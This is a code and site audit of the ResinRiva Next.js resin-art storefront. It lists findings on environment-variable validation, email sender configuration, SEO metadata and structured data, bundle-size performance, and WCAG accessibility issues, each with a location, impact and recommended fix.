- **Observation:** Recon confirmed and verified: there is no env schema module. process.env is read ad hoc across the codebase. src/lib/db.ts:13 passes `connectionString: process.env.DATABASE_URL` straight into PrismaPg with no guard — undefined yields an opaque pg connection error at first query, not a clear boot failure. RESEND_API_KEY, NEXT_PUBLIC_SITE_URL, NEXT_PUBLIC_WHATSAPP_NUMBER, GOOGLE_SERVICE_ACCOUNT_JSON, SCRAPE_SHEET_ID are all read with silent `?? fallback` / `if (!key) return`, so a typo'd or missing var degrades to a hardcoded default or a disabled feature with no signal.
- **Impact:** A deploy with a missing/typo'd DATABASE_URL, wrong NEXT_PUBLIC_SITE_URL (breaks canonical URLs, sitemap, OG images, wa.me 'Sent from' host) or missing RESEND_API_KEY produces no startup error — the site boots and quietly misbehaves. Hard to diagnose in production.
- **Recommendation:** Add src/lib/env.ts that parses process.env with a Zod schema (required: DATABASE_URL, AUTH_SECRET; typed-optional: RESEND_*, NEXT_PUBLIC_*) and export a typed `env`. Import it from db.ts/constants.ts/email.ts so a bad config throws once, loudly, at module load. Validate on build via the existing bootstrap.ts.
- **Status:** Verified

#### [ENG-003] Contact-form notification email hardcodes the Resend sandbox sender, bypassing studioFrom() — notifications won't deliver in production
- **Severity:** Minor
- **Effort:** S
- **Location:** `src/lib/email.ts:48`
- **Observation:** sendContactNotification sends with `from: "ResinRiva Website <onboarding@resend.dev>"` (email.ts:48), while the password-reset path correctly resolves the sender via studioFrom() which honors EMAIL_FROM / RESEND_EMAIL_DOMAIN (email.ts:71-77,134). Resend's shared onboarding@resend.dev sender only delivers to the account owner's own Resend address; it will not reach SITE.email once a real verified domain exists.
- **Impact:** After the owner verifies a domain (as the reset flow supports), new contact-form inquiry emails to the studio inbox silently stop arriving — they still hit the sandbox limitation. The DB Inquiry row is the fallback, but the intended email alert for the lead funnel is lost.
- **Recommendation:** Reuse studioFrom() in sendContactNotification: `from: studioFrom()`. It already exists in the same file.
- **Status:** Verified

#### [ENG-004] Six ESLint warnings: five React-Compiler memoization skips from react-hook-form watch(), one dead import
- **Severity:** Minor
- **Effort:** S
- **Location:** `src/components/studio/confirm-delete-dialog.tsx:3; src/components/studio/products/product-form.tsx:862; blog-post-form.tsx:172; pages/page-form.tsx:113; portfolio/portfolio-form.tsx:146`
- **Observation:** `npx eslint .` reports: confirm-delete-dialog.tsx:3 — `'useEffect' is defined but never used` (@typescript-eslint/no-unused-vars); plus five react-hooks/incompatible-library warnings where `watch(...)` from react-hook-form's useForm() opts the whole component out of React Compiler memoization (blog-post-form 172, page-form 113/114, portfolio-form 146-148, product-form 862).
- **Impact:** Dead import is trivial. The five watch() warnings mean five large studio form components are entirely skipped by the React Compiler — no auto-memoization — so they re-render more than necessary. Low user impact (studio-only), but they're noise that hides future real warnings.
- **Recommendation:** Delete the unused useEffect import. For the watch() warnings, prefer `useWatch({ control, name })` (compiler-friendly) over the destructured `watch()` where the value feeds render, or suppress with a scoped eslint-disable and a comment if intentional.
- **Status:** Verified

#### [ENG-005] Generated Prisma client is committed to git despite being .gitignored — drift risk between schema and checked-in client
- **Severity:** Minor
- **Effort:** S
- **Location:** `.gitignore:/src/generated, src/generated/prisma/client.ts`
- **Observation:** .gitignore lists `/src/generated`, yet `git ls-files src/generated` shows src/generated/prisma/client.ts (and the model files) are tracked. The client is also regenerated on every `postinstall` (`prisma generate`) and `build`. So the repo carries a tracked-but-ignored generated artifact.
- **Impact:** Because the path is ignored, `prisma generate` output changes won't show up as diffs, so the committed client can silently drift from schema.prisma and reviewers won't see it. It also bloats the repo/PRs. It's redundant given postinstall regenerates it.
- **Recommendation:** Pick one policy: either `git rm -r --cached src/generated` and rely on postinstall generation (keep the .gitignore entry), or intentionally commit it and remove the .gitignore line. The former is standard for Prisma's custom output dir.
- **Status:** Verified

#### [ENG-006] product-form.tsx is a 954-line client-component monolith
- **Severity:** Minor
- **Effort:** L
- **Location:** `src/components/studio/products/product-form.tsx (954 lines)`
- **Observation:** product-form.tsx is 954 LOC in a single client component — the largest non-generated, non-seed file after the scraper source lists (source-list.tsx 878, source-detail.tsx 721, review-grid.tsx 710). It mixes RHF field arrays, image upload, customization-field templating, SEO fields and validation in one file.
- **Impact:** High cognitive load and merge-conflict surface for the most-edited studio screen; hard to unit-test sections in isolation; it's also one of the components the React Compiler skips (ENG-004). Not a runtime defect, but a maintainability tax on the core catalog editing flow.
- **Recommendation:** Extract cohesive sub-forms (ImagesSection, CustomizationFieldsSection, SeoSection, PricingSection) as separate components receiving `control`/`register` via props or FormProvider context. Aim to bring the top-level file under ~300 lines.
- **Status:** Verified

#### [ENG-008] In-memory rate limiter and spam buckets are per-instance — ineffective across Vercel's serverless fan-out
- **Severity:** Minor
- **Effort:** M
- **Location:** `src/lib/rate-limit.ts:10-13, src/actions/order.ts:93, src/actions/public.ts:51`
- **Observation:** rateLimit uses a module-level `Map` (rate-limit.ts:11) that 'resets on cold start' (per its own comment) and is not shared between concurrent serverless instances. The order and contact actions are the abuse-protected public funnel (order.ts:93 limit 6/10min, public.ts:51 limit 5/10min).
- **Impact:** On Vercel, each concurrent lambda has its own Map, so the effective limit is roughly limit×instanceCount and resets frequently — a determined spammer can far exceed the intended 6 orders / 5 contacts per 10 min. The honeypot + fill-time checks still apply, so this is defense-in-depth degradation, not an open door.
- **Recommendation:** Acceptable for a no-paid-service spec, but document the limitation prominently, or move to a durable store (Vercel KV / Upstash free tier) keyed by IP if abuse appears. At minimum keep the honeypot/fill-time as the primary defense (they are stateless and unaffected).
- **Status:** Verified

#### [ENG-007] Organization/LocalBusiness JSON-LD ships empty sameAs and no address — weakens local SEO for the WhatsApp funnel
- **Severity:** Polish
- **Effort:** S
- **Location:** `src/app/(public)/layout.tsx:22,32`
- **Observation:** The site-wide BUSINESS_JSONLD emits `sameAs: []` with a `// TODO: add social profile urls when live` (layout.tsx:22) and a LocalBusiness address of only `addressCountry: "IN"` (layout.tsx:32). Meanwhile SiteSettings already has a `socials` Json field and an `address` field that are collected in the studio but not wired here (see ENG-001).
- **Impact:** Google's rich-result / knowledge-panel linking relies on sameAs and a fuller PostalAddress. For a discovery-driven, WhatsApp-only store, weaker structured data means fewer branded/social and map surfaces — a missed top-of-funnel opportunity, not a bug.
- **Recommendation:** Source sameAs from settings.socials and populate PostalAddress from settings.address (once ENG-001 loads settings in the layout). At minimum, fill the TODO with the live Instagram/WhatsApp business URLs.
- **Status:** Verified

### SEO/AEO (SEO)

#### [SEO-001] /search is indexable and listed in the sitemap, exposing infinite thin ?q= query pages
- **Severity:** Major
- **Effort:** S
- **Location:** `src/app/(public)/search/page.tsx:23-27; src/app/sitemap.ts:20`
- **Observation:** The search route sets `dynamic = "force-dynamic"` and a normal metadata block (title "Search") with NO `robots: { index:false }` and NO canonical. Every `/search?q=<anything>` renders the same template with query-driven content. sitemap.ts:20 explicitly submits `/search` (priority 0.3) for indexing. Contrast with whatsapp-order/page.tsx:21 which correctly sets `robots: { index:false, follow:false }`.
- **Impact:** Google can index unlimited near-duplicate/thin search-result URLs (one per query string), diluting crawl budget and cannibalising the shop/category pages that should rank. A parameter-driven page with no canonical self-canonicalises each variant.
- **Recommendation:** Add `robots: { index: false, follow: true }` to the search page metadata (and optionally `alternates: { canonical: "/search" }`). Remove the `/search` entry from STATIC_ROUTES in sitemap.ts — a query-only page has no business in the sitemap.
- **Status:** Verified

#### [SEO-002] Category listing pages (/shop/[category]) emit no canonical tag
- **Severity:** Major
- **Effort:** S
- **Location:** `src/app/(public)/shop/[category]/page.tsx:41-58`
- **Observation:** generateMetadata returns only `title` and `description` — no `alternates.canonical`. The page reads filter params `?occasion=`, `?band=`, `?sort=`, `?q=` (lines 74-79), so URLs like `/shop/nameplates?sort=price&band=2` each resolve to a distinct self-canonicalising page. Every other detail/listing route sets a canonical (shop/page.tsx:25, product/[slug]:97, blog/[slug]:153, portfolio/[slug]:118).
- **Impact:** Filter/sort permutations create many duplicate crawlable URLs of the same category collection with no signal pointing back to the clean `/shop/<slug>` URL, splitting ranking signals and wasting crawl budget.
- **Recommendation:** In shop/[category] generateMetadata add `alternates: { canonical: `/shop/${slug}` }` so all filtered/sorted variants consolidate to the base category URL (mirrors shop/page.tsx which self-canonicalises to /shop).
- **Status:** Verified

#### [SEO-003] Category pages have visual breadcrumbs but no BreadcrumbList / CollectionPage structured data
- **Severity:** Minor
- **Effort:** S
- **Location:** `src/app/(public)/shop/[category]/page.tsx:109-133`
- **Observation:** The category page renders a visual breadcrumb `<nav aria-label="Breadcrumb">` (Home / Shop / Category) but emits no JSON-LD. Product and blog detail pages both ship BreadcrumbList (product/[slug]:220-237, blog/[slug]:204-212); the category listing — a primary commercial entry point — ships none, and no CollectionPage/ItemList describing the product grid.
- **Impact:** Category pages miss breadcrumb rich-result eligibility in SERPs and give crawlers/answer-engines no structured description of the collection, weakening AEO citability for category-level queries (e.g. "resin nameplates").
- **Recommendation:** Add a `<JsonLd>` BreadcrumbList (Home > Shop > Category) matching the product-page pattern, and optionally a `CollectionPage` with an `ItemList` of the SSR product slugs/URLs.
- **Status:** Verified

#### [SEO-004] Product JSON-LD omits brand and carries no offer for price-hidden pieces (no image fallback)
- **Severity:** Minor
- **Effort:** S
- **Location:** `src/app/(public)/product/[slug]/page.tsx:198-218`
- **Observation:** The Product node has no `brand` property, and `offers` is only added when `product.showPrice && priceMin != null` (lines 206-217). For the many WhatsApp/enquire-only products, the schema is a bare Product with `image`, `name`, `description`, `category` — none of the properties (offers/review/aggregateRating) Google needs for a Product rich result. `image` is `galleryImages.map(...)` which is `[]` when no renderable image exists.
- **Impact:** Price-hidden products are ineligible for any Product rich result and provide answer engines no brand/seller anchor; an empty image array on image-less products can trigger structured-data warnings.
- **Recommendation:** Always add `brand: { "@type": "Brand", name: "ResinRiva" }`. For enquire-only pieces add an `offers` object with `availability: "https://schema.org/InStock"`, `priceCurrency: "INR"` and `url`, using `"0"`/`priceSpecification` per Google's guidance, or gate the whole `image` field so it is omitted rather than emitted empty.
- **Status:** Verified

#### [SEO-005] Homepage h1 is a keyword-free brand slogan
- **Severity:** Minor
- **Effort:** S
- **Location:** `src/components/sections/home-hero.tsx:59-66`
- **Observation:** The single h1 on the site's most important ranking page is `"Liquid luxury, cast forever."` — no target keywords. The keyword-bearing copy ("custom resin art · 3d printing · made to order") sits in an eyebrow `<p>` above it (lines 53-55), which carries no heading weight.
- **Impact:** The primary landing page's strongest on-page ranking signal (h1) contains none of the terms it needs to rank for (resin art, custom gifts, 3D printing), leaving the h1 doing brand work instead of SEO work.
- **Recommendation:** Either enrich the h1 to include a target phrase (e.g. "Liquid luxury — custom resin art, cast forever") or promote a keyworded h2 immediately below the hero. Verified single-h1-per-page across all public routes, so hierarchy itself is sound.
- **Status:** Verified

#### [SEO-006] No Twitter Card and no Open Graph defaults on root/static pages
- **Severity:** Minor
- **Effort:** S
- **Location:** `src/app/layout.tsx:21-29`
- **Observation:** Root metadata sets only `metadataBase`, `title` and `description` — no `openGraph` (siteName/locale/type) and no `twitter` block. Only product/blog/portfolio detail pages set `openGraph`; static pages (home, shop, about, contact, faq, etc.) get the file-based opengraph-image but no og:title/og:type/og:site_name/twitter:card.
- **Impact:** Shares of the home/shop/about pages to X and OG scrapers get an image with no explicit title/type/site-name, producing weaker, inconsistent share cards and losing `twitter:card=summary_large_image` styling.
- **Recommendation:** Add to root layout metadata: `openGraph: { type:"website", siteName: SITE.name, locale:"en_IN", url: SITE.url }` and `twitter: { card:"summary_large_image" }`. These inherit to every route via the Metadata API.
- **Status:** Verified

#### [SEO-007] Organization/LocalBusiness schema is thin — empty sameAs, country-only address, no hours/geo/priceRange
- **Severity:** Minor
- **Effort:** M
- **Location:** `src/app/(public)/layout.tsx:11-36`
- **Observation:** BUSINESS_JSONLD has `sameAs: []` with a `// TODO: add social profile urls` (line 22) despite an Instagram feed component existing on the home page; the LocalBusiness `address` is `{ addressCountry: "IN" }` only (line 32) with no locality/region, no `geo`, no `openingHours`, no `priceRange`, and `logo`/`image` point at `icon.svg`.
- **Impact:** An empty sameAs forfeits entity/knowledge-graph consolidation with the brand's social profiles; a country-only LocalBusiness provides answer engines almost nothing to cite for local or business-detail queries, weakening AEO.
- **Recommendation:** Populate `sameAs` with the Instagram/social URLs, add `addressLocality`/`addressRegion`, `openingHoursSpecification`, `priceRange` and (ideally) a raster `logo` to the Organization node. Consider a ContactPoint with `contactType: "customer service"` and the WhatsApp number.
- **Status:** Verified

#### [SEO-008] Sitemap lists every category regardless of published-product count and omits lastModified on static routes
- **Severity:** Minor
- **Effort:** S
- **Location:** `src/app/sitemap.ts:37,58-61,49-52`
- **Observation:** `db.category.findMany({ select: { slug: true } })` (line 37) has no `where` filter, so categories with zero PUBLISHED (non-DEMO) products are submitted as `/shop/<slug>` URLs (lines 58-61). Static routes (lines 49-52) are emitted with `priority` but no `lastModified`/`changeFrequency`.
- **Impact:** Empty category pages get submitted for indexing as thin content, and missing lastModified on static routes gives crawlers no freshness signal to prioritise recrawls.
- **Recommendation:** Filter categories to those with at least one published non-DEMO product (e.g. `where: { products: { some: { status:"PUBLISHED", NOT:{ title:{ startsWith:"DEMO" } } } } }`), and add a `lastModified` (build time or a settings.updatedAt) to the static route entries.
- **Status:** Verified

### Performance (PERF)

#### [PERF-001] Cloudinary & /uploads images use `unoptimized`, so no responsive srcset is generated — full-resolution originals ship to phones
- **Severity:** Major
- **Effort:** M
- **Location:** `src/lib/media.ts:9-22 (servesDirectly + CLOUDINARY base), src/components/sections/home-hero.tsx:41-43, src/components/shop/product-card.tsx:76-90`
- **Observation:** Every product/portfolio/hero/category image sets `unoptimized` whenever the URL is Cloudinary or /uploads (e.g. home-hero passes `priority unoptimized sizes="100vw"`). The Cloudinary base URL is only `.../upload/f_auto,q_auto` (media.ts:12-13) with NO `w_` width transform. Because `unoptimized` disables Next's srcset generation AND the URL has no width param, a single native-resolution image is delivered to all viewports. The carefully-written `sizes` attributes (100vw, card sizes, etc.) are therefore inert — the browser has only one candidate to choose from.
- **Impact:** The LCP hero and above-the-fold product cards download desktop-resolution JPEGs on mobile. On a 400px-wide phone a 2000px hero is served, inflating LCP and mobile data by 3-6x. This is the single biggest CWV risk on the site (LCP).
- **Recommendation:** Add a Cloudinary `loader` (next/image `loader` prop or `images.loader`/`loaderFile` in next.config) that injects `w_${width},c_limit` into the transform chain per requested srcset width, then DROP `unoptimized` for Cloudinary URLs so Next emits a proper srcset off Cloudinary's CDN (no Next optimizer round-trip needed). Keep `unoptimized` only for local `/uploads` if no on-the-fly resizing exists there.
- **Status:** Verified — Adversarial verify: ADJUSTED → Major. Partly real, partly misdescribed. CONFIRMED at home-hero.tsx:37-45: the Cloudinary hero uses `fill priority unoptimized sizes="100vw"`, and the Cloudinary base (media.ts:12-13) `upload/f_auto,q_auto` has no `w_`, so a single native-resolution image ships to all viewports and `sizes` is inert. Same unconditional-unoptimized-on-Cloudinary is true for the homepage feature (page.tsx:270), About (about/page.tsx:111), and category backdrops via servesDirectly (shop/[category]/page.tsx:102, page.tsx:354). HOWEVER the cited product-card.tsx:76-90 does NOT support the claim: the flag is `unoptimized={image.url.startsWith("/uploads")}` (line 77) and `...hoverImage.url.startsWith("/uploads")` (line 90) — conditional, keyed on /uploads only. Cloudinary product images get unoptimized=false, so Next DOES optimize them and generate a responsive srcset from CARD_SIZES. Only owner-uploaded /uploads product/portfolio images are unoptimized (same pattern in portfolio-card, gallery, quick-view, blog, before-after). So the reviewer's blanket 'every product/portfolio/...image sets unoptimized whenever Cloudinary or /uploads' and the 'above-the-fold product cards download desktop JPEGs' impact are false for Cloudinary cards. Two more imprecisions: f_auto delivers AVIF/WebP (not 'full-resolution JPEGs'), so only pixel dimensions are un-scaled, not the format; and the hero is a decorative opacity-60 alt='' backdrop under a WebGL mesh, so its LCP-element status is asserted not shown. Genuine single-resolution issue exists for hero/category/about/homepage-feature and all /uploads images, but the flagship product-card example is wrong and f_auto already cuts bytes — Critical/'single biggest CWV risk, 3-6x' is overstated; Major.

#### [PERF-002] GSAP (ScrollTrigger+SplitText, ~118KB) + Lenis load on EVERY route including the studio admin and static legal pages
- **Severity:** Major
- **Effort:** S
- **Location:** `src/app/layout.tsx:5,42 (SmoothScrollProvider in ROOT layout); src/components/providers/smooth-scroll-provider.tsx:5-6,19`
- **Observation:** SmoothScrollProvider is mounted in the root layout, wrapping both the public site and `/studio`. It imports `Lenis` and `gsap, ScrollTrigger` from @/lib/gsap. Build stats confirm chunk `1f-4cfc7t_--3.js` (118KB, contains ScrollTrigger+SplitText+gsap.registerPlugin) is in the first-load set of /privacy (877KB), / (923KB) AND /studio/login (705KB). The admin dashboard and static legal pages have no smooth-scroll or scroll-trigger animations yet pay for GSAP+Lenis.
- **Impact:** ~118KB of GSAP plus Lenis is parsed/executed on pages that never use it (whole /studio surface, /privacy, /terms), raising TBT/INP and first-load JS for the admin team and legal pages.
- **Recommendation:** Move SmoothScrollProvider out of the root layout into `src/app/(public)/layout.tsx` only. The studio route group gets a plain root layout with no smooth-scroll. This alone removes GSAP+Lenis from every /studio route.
- **Status:** Verified

#### [PERF-003] Contact page ships zod v4 (~315KB uncompressed chunk) to the client for a 4-field form
- **Severity:** Major
- **Effort:** M
- **Location:** `src/components/sections/contact-form.tsx:4,8,59 (zodResolver + `z` schema); chunk 068i63ccr5nlc.js (315KB, 488 zod refs)`
- **Observation:** contact-form.tsx ("use client") imports `z` from zod and `zodResolver`, building a client-side mirror schema for name/phone/email/message. Build stats show /contact first-load JS = 1224KB — the single heaviest public route — with the 315KB zod chunk (068i63ccr5nlc) present ONLY on /contact; /custom-order (978KB) does not pull zod, confirming zod is the ~250KB delta. The server action already re-validates authoritatively.
- **Impact:** The primary non-WhatsApp inquiry funnel loads a validation library heavier than the whole rest of the page's app code, hurting TBT/INP on the conversion surface.
- **Recommendation:** Drop client-side zod on this form: either (a) rely on native HTML validation + the server action's zod (which already exists), showing server-returned field errors, or (b) hand-roll the 4 regex/length checks (~15 lines) in the resolver. If zod must stay, lazy-load the form component with `next/dynamic({ssr:false})` so zod is not in the initial payload.
- **Status:** Verified

#### [PERF-004] High shared first-load JS baseline (~877KB uncompressed / ~250KB gz) on every public page, even static content
- **Severity:** Major
- **Effort:** L
- **Location:** `.next/diagnostics/route-bundle-stats.json (/privacy 877KB, / 923KB); src/app/(public)/layout.tsx:4-7,47-52`
- **Observation:** Even the fully-static /privacy and /terms pages carry 877KB uncompressed first-load JS. Composition (from chunk sizes): react-dom 227KB + motion/framer 131KB (chunk 2brlmj) + gsap 118KB (chunk 1f-4cfc7t) + ~107KB runtime + always-on client components mounted in the public layout: Preloader, CursorGlow, DynamicHeader, FloatingWhatsApp (all `use client`, all importing motion).
- **Impact:** Content-only pages (legal, FAQ, process) pay a full interactive-app JS cost for effectively static text, raising TBT and delaying INP readiness on mid/low-end mobile.
- **Recommendation:** Combine PERF-002 (gsap out of root) with trimming always-on motion: gate CursorGlow/Preloader behind idle/route-aware dynamic imports, and replace FloatingWhatsApp's motion spring (PERF-008) with CSS so `motion` is not forced by the layout. Target: get the motion (131KB) + gsap (118KB) libs out of the baseline for text-only routes.
- **Status:** Verified

#### [PERF-005] Behold Instagram widget script injected eagerly on mount, not deferred until near-viewport
- **Severity:** Minor
- **Effort:** S
- **Location:** `src/components/sections/instagram-feed.tsx:6,16-22`
- **Observation:** InstagramFeed injects `https://w.behold.so/widget.js` (an external ES module) into document.head inside a mount `useEffect` with no visibility gate. The feed renders far down the homepage, but the third-party script (uncontrolled size, external origin, its own network + hydration cost) begins downloading immediately on page load and competes with LCP resources.
- **Impact:** Third-party JS from w.behold.so contends for bandwidth/main-thread during initial load even though the widget is below the fold, adding to INP/LCP risk with a weight the site cannot control.
- **Recommendation:** Gate the script injection behind an IntersectionObserver on the widget container (load when within ~400px of viewport), or wrap InstagramFeed in `next/dynamic` and mount it via an IO sentinel. Optionally add `<link rel=preconnect>` only when about to load.
- **Status:** Verified

#### [PERF-006] Unused three.js / @react-three/* dependency tree bloats install & build (dead HeroCanvas)
- **Severity:** Minor
- **Effort:** S
- **Location:** `package.json (three, @react-three/fiber, @react-three/drei, @react-three/postprocessing); src/components/three/hero-canvas.tsx:52, src/components/three/resin-scene.tsx`
- **Observation:** HeroCanvas/ResinScene (the removed hero WebGL sphere) still exist but are imported nowhere — grep shows `HeroCanvas` referenced only inside its own file. I verified NO shipped chunk contains @react-three/useThree/extend(THREE), so this dead code is correctly tree-shaken OUT of the client bundle (good). However the four heavy deps (@react-three/fiber, drei, postprocessing, three) remain in package.json purely for dead files, inflating install size, `prisma generate`/build time, and lockfile surface, and risk accidental re-inclusion. (@google/model-viewer separately bundles its own three — the 1MB product chunk — and is legitimately used.)
- **Impact:** No runtime payload impact today (verified excluded), but multi-MB of unused node_modules and a standing footgun where a stray import would ship 1MB+.
- **Recommendation:** Delete src/components/three/hero-canvas.tsx + resin-scene.tsx and remove @react-three/fiber, @react-three/drei, @react-three/postprocessing, and (if nothing else uses it) `three` from package.json. Keep @google/model-viewer.
- **Status:** Verified

#### [PERF-007] First-visit Preloader overlay locks scroll and covers content for up to ~2s
- **Severity:** Minor
- **Effort:** S
- **Location:** `src/components/motion/preloader.tsx:11-13,48-51,65-72`
- **Observation:** On first visit (per sessionStorage) the Preloader renders a full-screen `fixed inset-0 z-[100]` overlay, sets `documentElement.style.overflow='hidden'`, holds the wordmark for EXIT_AFTER_MS=1400ms and hard-removes at MAX_BLOCK_MS=2000ms. It is reduced-motion aware and session-gated (good), but for a first-time visitor it delays perceived content paint and blocks interaction for up to 2s.
- **Impact:** Perceived-performance / engagement hit for first-time visitors (the exact users a luxury landing page wants to convert); the overlay sits above the LCP hero during the hold.
- **Recommendation:** Shorten to ~600-900ms total, and/or render the overlay so it fades over already-painted hero content rather than blocking it (don't lock scroll; start exit as soon as fonts/hero image `onLoad`). Consider skipping entirely on slow-connection (`navigator.connection.saveData`).
- **Status:** Verified

#### [PERF-009] Lenis smooth-scroll hijacks native scrolling site-wide — INP/scroll-jank risk on low-end mobile
- **Severity:** Minor
- **Effort:** M
- **Location:** `src/components/providers/smooth-scroll-provider.tsx:16-34`
- **Observation:** SmoothScrollProvider runs Lenis on the GSAP ticker (a continuous rAF loop) driving `smoothWheel` and calling ScrollTrigger.update on every scroll event for all public pages. It is correctly disabled under prefers-reduced-motion, but for the majority of users it replaces native scrolling with JS-driven scroll, which on mid/low-end Android raises INP and can introduce scroll jank/latency.
- **Impact:** Potential INP degradation and scroll latency on lower-powered devices; runtime CWV cannot be confirmed without field data.
- **Recommendation:** Keep, but consider disabling Lenis on coarse-pointer/touch devices (it mainly benefits desktop wheel) via a `(pointer: coarse)` check, and ensure `lagSmoothing(0)` isn't masking long tasks. Re-measure INP with Speed Insights (already installed) before/after.
- **Status:** Unverified

#### [PERF-008] FloatingWhatsApp pulls the `motion` library into the layout for a one-shot mount spring
- **Severity:** Polish
- **Effort:** S
- **Location:** `src/components/layout/floating-whatsapp.tsx:4,63-69`
- **Observation:** The always-mounted floating WhatsApp button (core conversion CTA) imports `motion/react` solely to scale-in on mount with a spring. The conversion link itself is a plain `<a href=wa.me...>` (correct — works with zero JS). But being a layout-level client component importing motion, it helps pin the 131KB motion chunk into every public page's baseline.
- **Impact:** Negligible functional cost (link works without JS) but contributes to keeping `motion` in the shared baseline (see PERF-004).
- **Recommendation:** Replace the mount spring with a CSS keyframe (`@keyframes pop`) and drop the `motion` import from this file; keep the anchor + CSS `animate-ping`. Removes one of the layout-level reasons motion is always loaded.
- **Status:** Verified

### Accessibility (A11Y)

#### [A11Y-001] Form error text fails contrast on the dark canvas (~2.7:1)
- **Severity:** Major
- **Effort:** S
- **Location:** `src/app/globals.css:44 (token) -> src/components/product/order-panel.tsx:384, src/components/sections/contact-form.tsx:137,155,177,195`
- **Observation:** --destructive is #9f2d20 in :root and is NOT overridden in the .dark block (globals.css:56-81), so every text-destructive validation message renders dark crimson on the public dark canvas (--background #0a0a0a / dark glass). Measured contrast of #9f2d20 on #0a0a0a is ~2.70:1.
- **Impact:** All inline validation errors on the contact form and the primary product order panel (the core WhatsApp conversion surface) fall well below the 4.5:1 AA threshold (WCAG 1.4.3). Low-vision users cannot read why their order/inquiry failed to submit.
- **Recommendation:** Add a dark-mode override for --destructive in the .dark block (e.g. a lighter crimson like #ef7d72 that clears 4.5:1 on #0a0a0a), or add a dedicated --destructive-text token used for error copy. Verify against both glass and card surfaces.
- **Status:** Verified

#### [A11Y-002] Focus indicator nearly invisible on dark canvas; CTAs strip the outline
- **Severity:** Major
- **Effort:** M
- **Location:** `src/app/globals.css:209-212; src/components/ui/button.tsx:8`
- **Observation:** Global focus is outline: 2px solid var(--sapphire); sapphire #0f52ba on void #0a0a0a measures ~2.77:1. buttonVariants sets outline-none and replaces it with focus-visible:ring-[3px] focus-visible:ring-ring/50 (50%-opacity sapphire), pushing the indicator even lower against the near-black background.
- **Impact:** Keyboard users cannot reliably see which control is focused across the dark public site, failing WCAG 1.4.11 (3:1 for focus indicators) and undermining 2.4.7. The primary gold CTAs null the outline entirely.
- **Recommendation:** Use a high-contrast focus ring on the dark canvas (porcelain or full-opacity azure #3b82f6) with a 2px offset outline that contrasts with both the button fill and the page; remove the ring/50 opacity. Ensure >=3:1 against the gold CTA fill and background.
- **Status:** Verified

#### [A11Y-003] Mobile menu dialog has no focus trap and leaves background focusable
- **Severity:** Major
- **Effort:** M
- **Location:** `src/components/layout/dynamic-header.tsx:253-275 (effect), 369-456 (overlay)`
- **Observation:** The mobile menu is a hand-rolled role=dialog aria-modal=true overlay. The effect only locks body scroll, closes on Escape, focuses the close button on open, and restores focus on close. There is no Tab/Shift+Tab containment and the underlying page is neither inert nor aria-hidden, so Tab moves focus into the header links and page content behind the overlay.
- **Impact:** Keyboard and screen-reader users can tab out of the open menu onto obscured background controls (WCAG 2.4.3; 1.3.1 since aria-modal support is inconsistent). This is the primary mobile navigation surface.
- **Recommendation:** Replace the custom overlay with Radix Dialog (already used correctly in ui/dialog.tsx), or add an explicit focus trap and set inert/aria-hidden on the sibling header and main while open.
- **Status:** Verified

#### [A11Y-004] Form errors not associated with inputs; no announcement or focus on failure
- **Severity:** Major
- **Effort:** M
- **Location:** `src/components/product/order-panel.tsx:207-214,374-408,620; src/components/sections/contact-form.tsx:129-198`
- **Observation:** Inputs set aria-invalid but error <p> elements are standalone text with no aria-describedby linking them to their field, and field-level errors carry no role/aria-live. In the order panel, validate() sets error state and returns (line 214) without moving focus to the first invalid field; only the top-level serverError has role=alert.
- **Impact:** Screen-reader users hear a field is invalid but never hear why, and on a failed submit of the primary order form nothing is announced and focus stays on the submit button (WCAG 3.3.1, 1.3.1, 4.1.3).
- **Recommendation:** Give each error a stable id and wire aria-describedby={errors.x ? errId : undefined} on the matching input; render errors with role=alert / aria-live=assertive. On validation failure, focus the first invalid control.
- **Status:** Verified

#### [A11Y-005] No skip-to-content link; main landmark has no target id
- **Severity:** Major
- **Effort:** S
- **Location:** `src/app/(public)/layout.tsx:49; src/app/studio/(dashboard)/layout.tsx:74`
- **Observation:** A repo-wide search for skip links / #main / a <main id> returns nothing. The public <main className=flex-1> has no id, and the fixed DynamicHeader with AnnouncementBar + primary nav + WhatsApp CTA renders before it on every page.
- **Impact:** Keyboard and screen-reader users must tab through the announcement bar, full primary nav, and CTA on every page load before reaching content, with no bypass mechanism (WCAG 2.4.1 Bypass Blocks).
- **Recommendation:** Add id=main-content to <main> and render a visually-hidden-until-focused skip link as the first focusable element (e.g. <a href=#main-content className='sr-only focus:not-sr-only ...'>Skip to content</a>). Apply to both public and studio layouts.
- **Status:** Verified

#### [A11Y-006] Behold Instagram widget has no fallback when the external module fails
- **Severity:** Minor
- **Effort:** M
- **Location:** `src/components/sections/instagram-feed.tsx:15-25`
- **Observation:** The component injects https://w.behold.so/widget.js and renders a bare <behold-widget feed-id=...> custom element via createElement. There is no noscript, no loading/error state, and no static fallback link. If the external script is blocked (CSP, ad-blockers, offline, Behold outage) the custom element hydrates to nothing.
- **Impact:** Users on restricted networks or with the script blocked get an empty, unlabeled region with no path to the studio's Instagram, and the widget's internal accessibility cannot be verified from the codebase (WCAG 1.1.1 / robustness for third-party content).
- **Recommendation:** Wrap the widget with server-rendered fallback content (a heading plus a real <a href={instagramProfileUrl}>View us on Instagram</a>) that stays visible if the custom element never upgrades, and give the region an accessible name (aria-label).
- **Status:** Verified

#### [A11Y-007] Required fields signalled only by an aria-hidden asterisk
- **Severity:** Minor
- **Effort:** S
- **Location:** `src/components/product/order-panel.tsx:507-511,301-306,370-372,390-392,592-615`
- **Observation:** Required custom fields, name, and phone mark requirement with <span aria-hidden className=text-destructive>*</span>. The asterisk is hidden from assistive tech and the underlying Input/SelectTrigger elements set no required or aria-required, so a screen reader cannot know a field is mandatory until it fails validation.
- **Impact:** Screen-reader users discover requirements only after a failed submit, adding friction to the primary conversion form (WCAG 3.3.2 Labels or Instructions).
- **Recommendation:** Add aria-required=true (or native required where appropriate) to required inputs/selects/chip-groups, and expose the requirement in the accessible name via sr-only text rather than aria-hidden.
- **Status:** Verified

#### [A11Y-008] Search placeholder text falls below contrast at ~3.6:1
- **Severity:** Minor
- **Effort:** S
- **Location:** `src/app/(public)/search/page.tsx:194`
- **Observation:** The search input uses placeholder:text-porcelain/40; porcelain #f8f9fa at 40% opacity blends to roughly #696a6b on the dark background, measuring ~3.6:1. The same low-opacity pattern (text-foreground/50, text-foreground/40) is used for hint copy across the order panel.
- **Impact:** Placeholder guidance is hard to read for low-vision users; where placeholders carry meaningful hint text this approaches a 1.4.3 concern.
- **Recommendation:** Raise placeholder opacity to at least porcelain/55-60 (>=4.5:1) or use a dedicated muted token verified against the dark canvas.
- **Status:** Verified

